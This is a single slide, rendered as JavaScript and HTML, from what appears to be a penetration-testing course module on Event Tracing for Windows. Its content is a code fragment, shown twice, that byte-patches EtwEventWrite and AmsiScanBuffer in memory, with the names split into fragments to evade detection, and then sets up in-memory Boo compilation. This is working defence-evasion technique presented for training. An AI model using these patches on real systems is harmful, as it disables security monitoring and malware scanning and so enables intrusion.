(function(){var loadHandler=window['sl_{9B7E1ACD-FE32-41D7-8304-031CE5D38424}'];loadHandler&&loadHandler(92, '<div id="spr0_96092"><div id="spr1_96092" class="kern slide"><img id="img2_96092" src="data/img3.png" width="960px" height="540px" alt="" style="left:0px;top:0px;"/><a id="hl0_96092" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(1, this);return false;" style="left:905.506px;top:222px;"><div id="svg3_96092" style="left:0px;top:0px;"><svg width="55" height="40" viewBox="0 0 55 40"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v40 h-54.494 Z"/></svg></div></a><div id="spr3_96092" style="left:905.506px;top:222px;"><div style="width:0px;"><a id="hl1_96092" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(1, this);return false;"><span id="txt0_96092" style="left:9.6px;top:1.764px;">d</span></a></div></div><a id="hl2_96092" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(326, this);return false;" style="left:905.506px;top:272.055px;"><div id="svg4_96092" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr4_96092" style="left:905.506px;top:272.055px;"><div style="width:0px;"><a id="hl3_96092" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(326, this);return false;"><span id="txt1_96092" style="left:9.6px;top:2.776px;">d</span></a></div></div><div id="spr5_96092" style="left:464px;top:504.919px;"><div style="width:0px;"><span id="txt2_96092" class="nokern" data-width="300.722656" style="left:73.433px;top:4.798px;">PTXv2: Section 4, Module 1 - Caendra Inc. © 2020</span></div></div><div id="svg5_96092" style="left:31.3px;top:501.094px;"><svg width="875" height="6" viewBox="-2.667 -1.333 875 6"><g fill="#c00000" stroke="none"><path stroke="#c00000" stroke-width="2.667" stroke-linecap="butt" transform="translate(-33.966309,-502.427063)" d="M33.966,503.76 H903.354"/></g></svg></div><a id="hl4_96092" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(1, this);return false;" style="left:905.506px;top:222px;"><div id="svg8_96092" style="left:0px;top:0px;"><svg width="55" height="40" viewBox="0 0 55 40"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v40 h-54.494 Z"/></svg></div></a><div id="spr6_96092" style="left:905.506px;top:222px;"><div style="width:0px;"><a id="hl5_96092" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(1, this);return false;"><span id="txt3_96092" style="left:9.6px;top:1.764px;">d</span></a></div></div><a id="hl6_96092" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(326, this);return false;" style="left:905.506px;top:272.055px;"><div id="svg9_96092" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr7_96092" style="left:905.506px;top:272.055px;"><div style="width:0px;"><a id="hl7_96092" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(326, this);return false;"><span id="txt4_96092" style="left:9.6px;top:2.776px;">d</span></a></div></div></div><div id="spr2_96092" class="kern slide"><div id="spr8_96092" style="left:63.75px;top:111.75px;"><div style="width:0px;"><span id="txt5_96092" class="nokern" data-width="57.609375" style="left:20.444px;top:33.265px;">    else:</span></div><div style="width:0px;"><span id="txt6_96092" class="nokern" data-width="166.427094" style="left:20.444px;top:48.455px;">        // 32 Bits process</span></div><div style="width:0px;"><span id="txt7_96092" class="nokern" data-width="198.432297" style="left:20.444px;top:63.815px;">        print &quot;[-] x86 Process&quot;</span></div><div style="width:0px;"><span id="txt8_96092" class="nokern" data-width="403.265625" style="left:20.444px;top:79.175px;">        etw_patch = array(byte, [0x33, 0xc0, 0xc2, 0x14, 0x00])</span></div><div style="width:0px;"><span id="txt9_96092" class="nokern" data-width="524.885437" style="left:20.444px;top:94.535px;">        amsi_patch = array(byte, [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00])</span></div><div style="width:0px;"><span id="txt10_96092" class="nokern" data-width="422.468750" style="left:20.444px;top:109.895px;">    PatchMem(&quot;nt&quot;+&quot;dll.dll&quot;, &quot;Etw&quot; + &quot;Event&quot; + &quot;Write&quot;, etw_patch)</span></div><div style="width:0px;"><span id="txt11_96092" class="nokern" data-width="441.671875" style="left:20.444px;top:125.255px;">    PatchMem(&quot;am&quot;+&quot;si.dll&quot;, &quot;Am&quot;+&quot;si&quot;+&quot;Sc&quot;+&quot;anBu&quot;+&quot;ffer&quot;, amsi_patch)</span></div><div style="width:0px;"><span id="txt12_96092" class="nokern" data-width="12.802084" style="left:20.444px;top:140.615px;">\'@</span></div><div style="width:0px;"><span id="txt13_96092" class="nokern" data-width="678.510437" style="left:20.444px;top:155.975px;">    #$scriptinput = New-Object &quot;Boo.Lang.Compiler.IO.StringInput&quot; -ArgumentList &quot;MyScript.boo, $BooSource&quot;</span></div><div style="width:0px;"><span id="txt14_96092" class="nokern" data-width="550.489624" style="left:20.444px;top:171.335px;">    $scriptinput = [Boo.Lang.Compiler.IO.StringInput]::new(&quot;MyScript.boo&quot;, $BooSource)</span></div><div style="width:0px;"><span id="txt15_96092" class="nokern" data-width="627.302124" style="left:20.444px;top:186.695px;">    #Passing $false to the constructor tells Boo to not automatically reference default assemblies</span></div><div style="width:0px;"><span id="txt16_96092" class="nokern" data-width="441.671875" style="left:20.444px;top:202.055px;">    $parameters = [Boo.Lang.Compiler.CompilerParameters]::new($false)</span></div><div style="width:0px;"><span id="txt17_96092" class="nokern" data-width="320.052094" style="left:20.444px;top:232.775px;">    $parameters.Input.Add($scriptinput) | Out-Null</span></div><div style="width:0px;"><span id="txt18_96092" class="nokern" data-width="505.682312" style="left:20.444px;top:248.135px;">    $parameters.Pipeline = [Boo.Lang.Compiler.Pipelines.CompileToMemory]::new()</span></div><div style="width:0px;"><span id="txt19_96092" class="nokern" data-width="505.682312" style="left:20.444px;top:263.495px;">    $parameters.Ducky = $true # $false increases speed but disables duck typing</span></div><div style="width:0px;"><span id="txt20_96092" class="nokern" data-width="800.130249" style="left:20.444px;top:278.855px;">    #Here we manually add assemblies as references to the compiler that will probably be used 100% of the time within our Boo</span></div><div style="width:0px;"><span id="txt21_96092" class="nokern" data-width="25.604168" style="left:20.444px;top:291.825px;">code</span></div><div style="width:0px;"><span id="txt22_96092" class="nokern" data-width="256.041687" style="left:20.444px;top:307.015px;">    $parameters.AddAssembly($BooLangAsm)</span></div><div style="width:0px;"><span id="txt23_96092" class="nokern" data-width="320.052094" style="left:20.444px;top:322.375px;">    $parameters.AddAssembly($BooLangExtensionsAsm)</span></div><div style="width:0px;"><span id="txt24_96092" class="nokern" data-width="307.250000" style="left:20.444px;top:337.735px;">    $parameters.AddAssembly($BooLangCompilerAsm)</span></div><div style="width:0px;"><span id="txt25_96092" class="nokern" data-width="294.447937" style="left:20.444px;top:353.095px;">    $parameters.AddAssembly($BooLangParserAsm)</span></div></div><div id="spr9_96092" style="left:63.75px;top:111.75px;"><img id="img0_96092" src="data/img48.png" width="840" height="398.25" alt=""/></div><div id="spr10_96092" style="left:63.75px;top:111.75px;"><div style="width:0px;"><span id="txt26_96092" class="nokern" data-width="57.609375" style="left:17.616px;top:30.436px;">    else:</span></div><div style="width:0px;"><span id="txt27_96092" class="nokern" data-width="166.427094" style="left:17.616px;top:45.627px;">        // 32 Bits process</span></div><div style="width:0px;"><span id="txt28_96092" class="nokern" data-width="198.432297" style="left:17.616px;top:60.987px;">        print &quot;[-] x86 Process&quot;</span></div><div style="width:0px;"><span id="txt29_96092" class="nokern" data-width="403.265625" style="left:17.616px;top:76.347px;">        etw_patch = array(byte, [0x33, 0xc0, 0xc2, 0x14, 0x00])</span></div><div style="width:0px;"><span id="txt30_96092" class="nokern" data-width="524.885437" style="left:17.616px;top:91.707px;">        amsi_patch = array(byte, [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00])</span></div><div style="width:0px;"><span id="txt31_96092" class="nokern" data-width="422.468750" style="left:17.616px;top:107.067px;">    PatchMem(&quot;nt&quot;+&quot;dll.dll&quot;, &quot;Etw&quot; + &quot;Event&quot; + &quot;Write&quot;, etw_patch)</span></div><div style="width:0px;"><span id="txt32_96092" class="nokern" data-width="441.671875" style="left:17.616px;top:122.427px;">    PatchMem(&quot;am&quot;+&quot;si.dll&quot;, &quot;Am&quot;+&quot;si&quot;+&quot;Sc&quot;+&quot;anBu&quot;+&quot;ffer&quot;, amsi_patch)</span></div><div style="width:0px;"><span id="txt33_96092" class="nokern" data-width="12.802084" style="left:17.616px;top:137.787px;">\'@</span></div><div style="width:0px;"><span id="txt34_96092" class="nokern" data-width="678.510437" style="left:17.616px;top:153.147px;">    #$scriptinput = New-Object &quot;Boo.Lang.Compiler.IO.StringInput&quot; -ArgumentList &quot;MyScript.boo, $BooSource&quot;</span></div><div style="width:0px;"><span id="txt35_96092" class="nokern" data-width="550.489624" style="left:17.616px;top:168.507px;">    $scriptinput = [Boo.Lang.Compiler.IO.StringInput]::new(&quot;MyScript.boo&quot;, $BooSource)</span></div><div style="width:0px;"><span id="txt36_96092" class="nokern" data-width="627.302124" style="left:17.616px;top:183.867px;">    #Passing $false to the constructor tells Boo to not automatically reference default assemblies</span></div><div style="width:0px;"><span id="txt37_96092" class="nokern" data-width="441.671875" style="left:17.616px;top:199.227px;">    $parameters = [Boo.Lang.Compiler.CompilerParameters]::new($false)</span></div><div style="width:0px;"><span id="txt38_96092" class="nokern" data-width="320.052094" style="left:17.616px;top:229.947px;">    $parameters.Input.Add($scriptinput) | Out-Null</span></div><div style="width:0px;"><span id="txt39_96092" class="nokern" data-width="505.682312" style="left:17.616px;top:245.307px;">    $parameters.Pipeline = [Boo.Lang.Compiler.Pipelines.CompileToMemory]::new()</span></div><div style="width:0px;"><span id="txt40_96092" class="nokern" data-width="505.682312" style="left:17.616px;top:260.667px;">    $parameters.Ducky = $true # $false increases speed but disables duck typing</span></div><div style="width:0px;"><span id="txt41_96092" class="nokern" data-width="800.130249" style="left:17.616px;top:276.027px;">    #Here we manually add assemblies as references to the compiler that will probably be used 100% of the time within our Boo</span></div><div style="width:0px;"><span id="txt42_96092" class="nokern" data-width="25.604168" style="left:17.616px;top:288.996px;">code</span></div><div style="width:0px;"><span id="txt43_96092" class="nokern" data-width="256.041687" style="left:17.616px;top:304.187px;">    $parameters.AddAssembly($BooLangAsm)</span></div><div style="width:0px;"><span id="txt44_96092" class="nokern" data-width="320.052094" style="left:17.616px;top:319.547px;">    $parameters.AddAssembly($BooLangExtensionsAsm)</span></div><div style="width:0px;"><span id="txt45_96092" class="nokern" data-width="307.250000" style="left:17.616px;top:334.907px;">    $parameters.AddAssembly($BooLangCompilerAsm)</span></div><div style="width:0px;"><span id="txt46_96092" class="nokern" data-width="294.447937" style="left:17.616px;top:350.267px;">    $parameters.AddAssembly($BooLangParserAsm)</span></div></div><img id="img1_96092" src="data/img19.png" width="23.25" height="20.25" alt="" style="left:60.11px;top:111.375px;"/><div id="spr11_96092" style="left:832.34px;top:504.755px;"><div style="width:0px;"><span id="txt47_96092" class="nokern" data-width="36.692707" style="left:9.6px;top:4.798px;">|  p.93</span></div></div><div id="spr12_96092" style="left:34.91px;top:6px;"><div style="width:0px;"><span id="txt48_96092" data-width="531.421265" style="left:9.6px;top:27.438px;">1.4 Event Tracing for Windows</span></div></div></div></div>');})();